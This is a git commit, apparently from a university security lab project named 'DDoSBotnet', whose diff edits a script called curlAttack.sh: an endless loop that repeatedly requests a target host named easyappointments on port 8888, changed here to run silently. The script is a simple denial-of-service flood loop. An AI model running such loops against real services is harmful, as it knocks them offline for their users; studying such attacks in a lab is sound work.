313e81eca33b0c907e4c4481a07b3ab10e7c29b0
David Coimbra <david.coimbra@tecnico.ulisboa.pt>
2018-11-26 22:40:05 +0000

    lol

--- DDoSBotnet/DDoSBot/curlAttack.sh
+++ DDoSBotnet/DDoSBot/curlAttack.sh
@@ -2,7 +2,7 @@
 while true
 do
 #Please use 'man curl' to see what -vk is for, also -X command can be useful too.
-curl -vk easyappointments:8888
+curl -sk easyappointments:8888 > /dev/null
 #sleep 5
 done
 exit 0
